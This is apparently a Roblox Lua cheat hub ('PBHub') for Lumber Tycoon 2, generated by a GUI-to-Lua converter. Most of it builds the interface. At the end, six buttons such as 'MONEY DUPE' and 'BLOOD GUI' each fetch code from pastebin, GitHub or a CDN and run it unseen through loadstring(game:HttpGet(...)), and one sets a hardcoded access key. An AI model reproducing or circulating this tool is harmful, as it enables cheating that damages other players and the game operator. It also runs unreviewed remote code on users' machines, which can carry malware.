-- Gui to Lua
-- Version: 3.2

-- Instances:

local PBHub = Instance.new("ScreenGui")
local LT2GUI = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Script1 = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Script2 = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Script4 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Script3 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Script5 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Script6 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TITLE = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local SelectingGame = Instance.new("Frame")
local SubmitButton = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local GamesList = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local EnterGameNameBox = Instance.new("TextBox")
local UICorner_10 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local found = Instance.new("TextLabel")
local G_LIST = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local UIListLayout = Instance.new("UIListLayout")
local BLANKSPACELUL = Instance.new("TextLabel")
local BLANKSPACELUL_2 = Instance.new("TextLabel")
local BLANKSPACELUL_3 = Instance.new("TextLabel")
local BLANKSPACELUL_4 = Instance.new("TextLabel")
local BLANKSPACELUL_5 = Instance.new("TextLabel")
local BLANKSPACELUL_6 = Instance.new("TextLabel")
local BLANKSPACELUL_7 = Instance.new("TextLabel")
local BLANKSPACELUL_8 = Instance.new("TextLabel")
local BLANKSPACELUL_9 = Instance.new("TextLabel")
local BLANKSPACELUL_10 = Instance.new("TextLabel")
local BLANKSPACELUL_11 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local ValidGames = Instance.new("Folder")
local LT2Value = Instance.new("BoolValue")
LT2Value.Value = true
LT2Value.Name = "lumber tycoon 2"
local ObjectLT2 = Instance.new("ObjectValue")
ObjectLT2.Value = LT2GUI
ObjectLT2.Name = "FRAMEOBJECT"
LT2Value.Parent = ValidGames
ObjectLT2.Parent = LT2Value

--Properties:

PBHub.Name = "PBHub"
PBHub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
PBHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

LT2GUI.Name = "LT2GUI"
LT2GUI.Parent = PBHub
LT2GUI.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
LT2GUI.Position = UDim2.new(0.370312482, 0, 0.375, 0)
LT2GUI.Size = UDim2.new(0.259246051, 0, 0.25, 0)
LT2GUI.Visible = false

UICorner.Parent = LT2GUI

Script1.Name = "Script1"
Script1.Parent = LT2GUI
Script1.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Script1.Position = UDim2.new(0.0500000007, 0, 0.200000003, 0)
Script1.Size = UDim2.new(0.400000006, 0, 0.150000006, 0)
Script1.Font = Enum.Font.TitilliumWeb
Script1.Text = "EXTREME LUMBER"
Script1.TextColor3 = Color3.fromRGB(255, 255, 255)
Script1.TextScaled = true
Script1.TextSize = 14.000
Script1.TextWrapped = true

UICorner_2.Parent = Script1

Script2.Name = "Script2"
Script2.Parent = LT2GUI
Script2.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Script2.Position = UDim2.new(0.542480886, 0, 0.200000003, 0)
Script2.Size = UDim2.new(0.400000006, 0, 0.150000006, 0)
Script2.Font = Enum.Font.TitilliumWeb
Script2.Text = "BARK OP GUI"
Script2.TextColor3 = Color3.fromRGB(255, 255, 255)
Script2.TextScaled = true
Script2.TextSize = 14.000
Script2.TextWrapped = true

UICorner_3.Parent = Script2

Script4.Name = "Script4"
Script4.Parent = LT2GUI
Script4.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Script4.Position = UDim2.new(0.545312941, 0, 0.470935941, 0)
Script4.Size = UDim2.new(0.400000006, 0, 0.150000006, 0)
Script4.Font = Enum.Font.TitilliumWeb
Script4.Text = "BLOOD GUI"
Script4.TextColor3 = Color3.fromRGB(255, 255, 255)
Script4.TextScaled = true
Script4.TextSize = 14.000
Script4.TextWrapped = true

UICorner_4.Parent = Script4

Script3.Name = "Script3"
Script3.Parent = LT2GUI
Script3.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Script3.Position = UDim2.new(0.0528320596, 0, 0.470935941, 0)
Script3.Size = UDim2.new(0.400000006, 0, 0.150000006, 0)
Script3.Font = Enum.Font.TitilliumWeb
Script3.Text = "DIRT MENU"
Script3.TextColor3 = Color3.fromRGB(255, 255, 255)
Script3.TextScaled = true
Script3.TextSize = 14.000
Script3.TextWrapped = true

UICorner_5.Parent = Script3

Script5.Name = "Script5"
Script5.Parent = LT2GUI
Script5.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Script5.Position = UDim2.new(0.052832067, 0, 0.727093577, 0)
Script5.Size = UDim2.new(0.400000006, 0, 0.150000006, 0)
Script5.Font = Enum.Font.TitilliumWeb
Script5.Text = "GET TREE"
Script5.TextColor3 = Color3.fromRGB(255, 255, 255)
Script5.TextScaled = true
Script5.TextSize = 14.000
Script5.TextWrapped = true

UICorner_6.Parent = Script5

Script6.Name = "Script6"
Script6.Parent = LT2GUI
Script6.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Script6.Position = UDim2.new(0.542778254, 0, 0.727093577, 0)
Script6.Size = UDim2.new(0.400000006, 0, 0.150000006, 0)
Script6.Font = Enum.Font.TitilliumWeb
Script6.Text = "MONEY DUPE"
Script6.TextColor3 = Color3.fromRGB(255, 255, 255)
Script6.TextScaled = true
Script6.TextSize = 14.000
Script6.TextWrapped = true

UICorner_7.Parent = Script6

TITLE.Name = "TITLE"
TITLE.Parent = LT2GUI
TITLE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TITLE.BackgroundTransparency = 1.000
TITLE.Size = UDim2.new(1, 0, 0.129556686, 0)
TITLE.Font = Enum.Font.GothamBold
TITLE.Text = "PBHub"
TITLE.TextColor3 = Color3.fromRGB(255, 255, 255)
TITLE.TextScaled = true
TITLE.TextSize = 14.000
TITLE.TextWrapped = true

Frame.Parent = TITLE
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 0.899999976, 0)
Frame.Size = UDim2.new(1, 0, 0.100000001, 0)

SelectingGame.Name = "SelectingGame"
SelectingGame.Parent = PBHub
SelectingGame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SelectingGame.BackgroundTransparency = 1.000
SelectingGame.Size = UDim2.new(1, 0, 1, 0)

SubmitButton.Name = "SubmitButton"
SubmitButton.Parent = SelectingGame
SubmitButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
SubmitButton.Position = UDim2.new(0.433150381, 0, 0.625123143, 0)
SubmitButton.Size = UDim2.new(0.130999997, 0, 0.0500000007, 0)
SubmitButton.Font = Enum.Font.SourceSansBold
SubmitButton.Text = "SUBMIT GAME"
SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitButton.TextSize = 20.000
SubmitButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
SubmitButton.TextWrapped = true

UICorner_8.Parent = SubmitButton

GamesList.Name = "GamesList"
GamesList.Parent = SelectingGame
GamesList.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
GamesList.Position = UDim2.new(0.433999985, 0, 0.550000012, 0)
GamesList.Size = UDim2.new(0.130999997, 0, 0.0500000007, 0)
GamesList.Font = Enum.Font.SourceSansBold
GamesList.Text = "VIEW GAMES LIST"
GamesList.TextColor3 = Color3.fromRGB(255, 255, 255)
GamesList.TextSize = 20.000
GamesList.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
GamesList.TextWrapped = true

UICorner_9.Parent = GamesList

EnterGameNameBox.Name = "EnterGameNameBox"
EnterGameNameBox.Parent = SelectingGame
EnterGameNameBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
EnterGameNameBox.Position = UDim2.new(0.433857232, 0, 0.474999964, 0)
EnterGameNameBox.Size = UDim2.new(0.131435856, 0, 0.0500000045, 0)
EnterGameNameBox.Font = Enum.Font.SourceSansBold
EnterGameNameBox.PlaceholderColor3 = Color3.fromRGB(148, 148, 148)
EnterGameNameBox.PlaceholderText = "Game Name"
EnterGameNameBox.Text = ""
EnterGameNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
EnterGameNameBox.TextSize = 20.000
EnterGameNameBox.TextWrapped = true

UICorner_10.Parent = EnterGameNameBox

TextLabel.Parent = EnterGameNameBox
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(-0.5, 0, -1.5, 0)
TextLabel.Size = UDim2.new(2, 0, 1, 0)
TextLabel.Font = Enum.Font.RobotoMono
TextLabel.Text = "PLEASE ENTER YOUR GAME'S NAME"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

found.Name = "found"
found.Parent = EnterGameNameBox
found.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
found.BackgroundTransparency = 1.000
found.Position = UDim2.new(-0.512928307, 0, 0.982759178, 0)
found.Size = UDim2.new(2, 0, 0.517241299, 0)
found.Visible = false
found.Font = Enum.Font.RobotoMono
found.Text = "GAME FOUND"
found.TextColor3 = Color3.fromRGB(151, 255, 71)
found.TextSize = 14.000
found.TextWrapped = true

G_LIST.Name = "G_LIST"
G_LIST.Parent = SelectingGame
G_LIST.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
G_LIST.Position = UDim2.new(0.75, 0, 0.300000012, 0)
G_LIST.Size = UDim2.new(0.203993201, 0, 0.399999976, 0)
G_LIST.Visible = false

UICorner_11.Parent = G_LIST

TextLabel_2.Parent = G_LIST
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
TextLabel_2.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Lumber Tycoon 2"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

UIListLayout.Parent = G_LIST
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

BLANKSPACELUL.Name = "BLANKSPACELUL"
BLANKSPACELUL.Parent = G_LIST
BLANKSPACELUL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL.BackgroundTransparency = 1.000
BLANKSPACELUL.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL.Font = Enum.Font.SourceSans
BLANKSPACELUL.Text = "- END OF LIST -"
BLANKSPACELUL.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL.TextScaled = true
BLANKSPACELUL.TextSize = 14.000
BLANKSPACELUL.TextWrapped = true

BLANKSPACELUL_2.Name = "BLANKSPACELUL"
BLANKSPACELUL_2.Parent = G_LIST
BLANKSPACELUL_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_2.BackgroundTransparency = 1.000
BLANKSPACELUL_2.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_2.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_2.Font = Enum.Font.SourceSans
BLANKSPACELUL_2.Text = " "
BLANKSPACELUL_2.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_2.TextScaled = true
BLANKSPACELUL_2.TextSize = 14.000
BLANKSPACELUL_2.TextWrapped = true

BLANKSPACELUL_3.Name = "BLANKSPACELUL"
BLANKSPACELUL_3.Parent = G_LIST
BLANKSPACELUL_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_3.BackgroundTransparency = 1.000
BLANKSPACELUL_3.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_3.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_3.Font = Enum.Font.SourceSans
BLANKSPACELUL_3.Text = " "
BLANKSPACELUL_3.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_3.TextScaled = true
BLANKSPACELUL_3.TextSize = 14.000
BLANKSPACELUL_3.TextWrapped = true

BLANKSPACELUL_4.Name = "BLANKSPACELUL"
BLANKSPACELUL_4.Parent = G_LIST
BLANKSPACELUL_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_4.BackgroundTransparency = 1.000
BLANKSPACELUL_4.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_4.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_4.Font = Enum.Font.SourceSans
BLANKSPACELUL_4.Text = " "
BLANKSPACELUL_4.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_4.TextScaled = true
BLANKSPACELUL_4.TextSize = 14.000
BLANKSPACELUL_4.TextWrapped = true

BLANKSPACELUL_5.Name = "BLANKSPACELUL"
BLANKSPACELUL_5.Parent = G_LIST
BLANKSPACELUL_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_5.BackgroundTransparency = 1.000
BLANKSPACELUL_5.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_5.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_5.Font = Enum.Font.SourceSans
BLANKSPACELUL_5.Text = " "
BLANKSPACELUL_5.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_5.TextScaled = true
BLANKSPACELUL_5.TextSize = 14.000
BLANKSPACELUL_5.TextWrapped = true

BLANKSPACELUL_6.Name = "BLANKSPACELUL"
BLANKSPACELUL_6.Parent = G_LIST
BLANKSPACELUL_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_6.BackgroundTransparency = 1.000
BLANKSPACELUL_6.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_6.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_6.Font = Enum.Font.SourceSans
BLANKSPACELUL_6.Text = " "
BLANKSPACELUL_6.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_6.TextScaled = true
BLANKSPACELUL_6.TextSize = 14.000
BLANKSPACELUL_6.TextWrapped = true

BLANKSPACELUL_7.Name = "BLANKSPACELUL"
BLANKSPACELUL_7.Parent = G_LIST
BLANKSPACELUL_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_7.BackgroundTransparency = 1.000
BLANKSPACELUL_7.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_7.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_7.Font = Enum.Font.SourceSans
BLANKSPACELUL_7.Text = " "
BLANKSPACELUL_7.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_7.TextScaled = true
BLANKSPACELUL_7.TextSize = 14.000
BLANKSPACELUL_7.TextWrapped = true

BLANKSPACELUL_8.Name = "BLANKSPACELUL"
BLANKSPACELUL_8.Parent = G_LIST
BLANKSPACELUL_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_8.BackgroundTransparency = 1.000
BLANKSPACELUL_8.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_8.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_8.Font = Enum.Font.SourceSans
BLANKSPACELUL_8.Text = " "
BLANKSPACELUL_8.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_8.TextScaled = true
BLANKSPACELUL_8.TextSize = 14.000
BLANKSPACELUL_8.TextWrapped = true

BLANKSPACELUL_9.Name = "BLANKSPACELUL"
BLANKSPACELUL_9.Parent = G_LIST
BLANKSPACELUL_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_9.BackgroundTransparency = 1.000
BLANKSPACELUL_9.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_9.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_9.Font = Enum.Font.SourceSans
BLANKSPACELUL_9.Text = " "
BLANKSPACELUL_9.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_9.TextScaled = true
BLANKSPACELUL_9.TextSize = 14.000
BLANKSPACELUL_9.TextWrapped = true

BLANKSPACELUL_10.Name = "BLANKSPACELUL"
BLANKSPACELUL_10.Parent = G_LIST
BLANKSPACELUL_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_10.BackgroundTransparency = 1.000
BLANKSPACELUL_10.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_10.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_10.Font = Enum.Font.SourceSans
BLANKSPACELUL_10.Text = " "
BLANKSPACELUL_10.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_10.TextScaled = true
BLANKSPACELUL_10.TextSize = 14.000
BLANKSPACELUL_10.TextWrapped = true

BLANKSPACELUL_11.Name = "BLANKSPACELUL"
BLANKSPACELUL_11.Parent = G_LIST
BLANKSPACELUL_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_11.BackgroundTransparency = 1.000
BLANKSPACELUL_11.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
BLANKSPACELUL_11.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
BLANKSPACELUL_11.Font = Enum.Font.SourceSans
BLANKSPACELUL_11.Text = " "
BLANKSPACELUL_11.TextColor3 = Color3.fromRGB(255, 255, 255)
BLANKSPACELUL_11.TextScaled = true
BLANKSPACELUL_11.TextSize = 14.000
BLANKSPACELUL_11.TextWrapped = true

TextLabel_3.Parent = G_LIST
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0, 0, -4.69790322e-08, 0)
TextLabel_3.Size = UDim2.new(1.00000012, 0, 0.066133, 0)
TextLabel_3.Font = Enum.Font.GothamSemibold
TextLabel_3.Text = "MORE GAMES COMING SOON!"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 67, 67)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

ValidGames.Name = "ValidGames"
ValidGames.Parent = PBHub

-- Scripts:

local function OVCC_fake_script() -- PBHub.Main 
	local script = Instance.new('LocalScript', PBHub)

	local bl = Instance.new("BlurEffect", game.Lighting)
	bl.Name = "PBHubBlur"
	
	script.Parent.SelectingGame.GamesList.MouseButton1Click:Connect(function()
		if script.Parent.SelectingGame.G_LIST.Visible == true then
			script.Parent.SelectingGame.G_LIST.Visible = false
		elseif script.Parent.SelectingGame.G_LIST.Visible == false then
			script.Parent.SelectingGame.G_LIST.Visible = true
		end
	end)
	
	script.Parent.SelectingGame.SubmitButton.MouseButton1Click:Connect(function()
		if script.Parent.ValidGames:FindFirstChild(string.lower(script.Parent.SelectingGame.EnterGameNameBox.Text)) then
			game.TweenService:Create(game.Lighting:FindFirstChild("PBHubBlur"), TweenInfo.new(1), {Size = 0}):Play()
			script.Parent.SelectingGame.Visible = false
			script.Parent.ValidGames:FindFirstChild(string.lower(script.Parent.SelectingGame.EnterGameNameBox.Text)).FRAMEOBJECT.Value.Visible = true
		end
	end)
end
coroutine.wrap(OVCC_fake_script)()
local function KUEKTRF_fake_script() -- LT2GUI.DragScript 
	local script = Instance.new('LocalScript', LT2GUI)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(KUEKTRF_fake_script)()
local function XCLKNXX_fake_script() -- Script1.LocalScript 
	local script = Instance.new('LocalScript', Script1)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/c2P8qcnE"))()
	end)
end
coroutine.wrap(XCLKNXX_fake_script)()
local function CBOFO_fake_script() -- Script2.LocalScript 
	local script = Instance.new('LocalScript', Script2)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGetAsync'https://cdn.applebee1558.com/bark/bark.lua')('8.4 beta released :))')
	end)
end
coroutine.wrap(CBOFO_fake_script)()
local function UWPXESH_fake_script() -- Script4.LocalScript 
	local script = Instance.new('LocalScript', Script4)

	script.Parent.MouseButton1Click:Connect(function()
		_G.BloodKey = "AV1115ODDY25052021HackerAV1115"
		loadstring(game:HttpGet("https://raw.githubusercontent.com/BloodStillCool/666blood666/main/nil"))()
		
		
	end)
end
coroutine.wrap(UWPXESH_fake_script)()
local function WTFKSZZ_fake_script() -- Script3.LocalScript 
	local script = Instance.new('LocalScript', Script3)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/wFjy4D4K"))()
	end)
end
coroutine.wrap(WTFKSZZ_fake_script)()
local function FCVIY_fake_script() -- Script5.LocalScript 
	local script = Instance.new('LocalScript', Script5)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/FPXAxsf3"))()
	end)
end
coroutine.wrap(FCVIY_fake_script)()
local function KYFQKR_fake_script() -- Script6.LocalScript 
	local script = Instance.new('LocalScript', Script6)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/WPLSfiNE"))()
	end)
end
coroutine.wrap(KYFQKR_fake_script)()
local function EKFUMWW_fake_script() -- EnterGameNameBox.LocalScript 
	local script = Instance.new('LocalScript', EnterGameNameBox)

	script.Parent:GetPropertyChangedSignal("Text"):Connect(function()
		if string.lower(script.Parent.Text) == "lumber tycoon 2" then
			script.Parent.found.Visible = true
		else
			script.Parent.found.Visible = false
		end
	end)
end
coroutine.wrap(EKFUMWW_fake_script)()
